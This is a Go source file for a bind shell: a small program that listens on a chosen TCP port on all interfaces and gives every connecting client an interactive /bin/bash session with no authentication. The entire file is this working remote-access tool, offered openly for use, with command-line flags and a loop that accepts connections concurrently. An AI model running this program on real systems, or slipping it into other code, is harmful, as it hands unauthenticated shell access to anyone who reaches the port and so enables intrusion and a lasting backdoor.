package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
)

// handler function to execute commands
func handler(conn net.Conn) {
	cmd := exec.Command("/bin/bash", "-i")
	read_pipe, write_pipe := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = write_pipe
	go io.Copy(conn, read_pipe)
	cmd.Run()
	conn.Close()
}

func flags() string {
	var port string

	flag.StringVar(&port, "p", "", "Port to listen on. Use -h or --help for more")
	flag.Parse()

	if port == "" {
		fmt.Println("No port provided. Please provide a port to listen on. Use --help or -h for more info")
		os.Exit(1)
	}

	return port

}

func main() {
	//Bind to a given tcp port
	port_to_listen := fmt.Sprintf(":%s", flags())

	listener, err := net.Listen("tcp", port_to_listen)
	if err != nil {
		log.Fatalln("Unable to Bind to port")
	}

	log.Printf("Listening on 0.0.0.0%s", port_to_listen)

	for {
		// Wait for connection

		connection, err := listener.Accept()
		log.Println("Recieved Connection")
		if err != nil {
			log.Fatalln("unable to accept connection")
		}

		//Handle the connection. Uses goroutine for concurrency
		go handler(connection)
	}
}
